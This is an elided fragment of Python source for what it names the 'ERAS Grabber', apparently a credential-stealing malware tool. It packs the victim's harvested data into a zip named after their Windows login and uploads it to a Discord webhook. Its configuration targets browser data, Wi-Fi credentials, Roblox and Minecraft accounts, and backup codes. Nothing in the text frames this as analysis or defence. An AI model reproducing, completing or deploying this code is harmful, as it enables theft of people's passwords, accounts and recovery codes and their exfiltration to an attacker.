...
def main(webhook: str):
    ...
    data = {
        "username": "ERAS",
        "avatar_url": "https://cdn.discordapp.com/attachments/1137203203197370452/1150699007505612851/istockphoto-951781720-170667a-removebg-preview.png"
    }

    _file = f'{localappdata}\\ERAS-Logged-{os.getlogin()}.zip'
    ...
    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes"]):
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'ERAS-Logged-{os.getlogin()}.zip', file, 'application/zip')})
...
def zipup():
    _zipfile = os.path.join(localappdata, f'ERAS-Logged-{os.getlogin()}.zip')
            ...
            "embeds": [
                {
                    ...
                    "footer": {
                        "text": "ERAS Grabber | Created By M3zof"
                    },
                    "thumbnail": {
                        "url": "https://cdn.discordapp.com/attachments/1137203203197370452/1150699007505612851/istockphoto-951781720-170667a-removebg-preview.png"
                    }
                }
            ],
            "username": "ERAS",
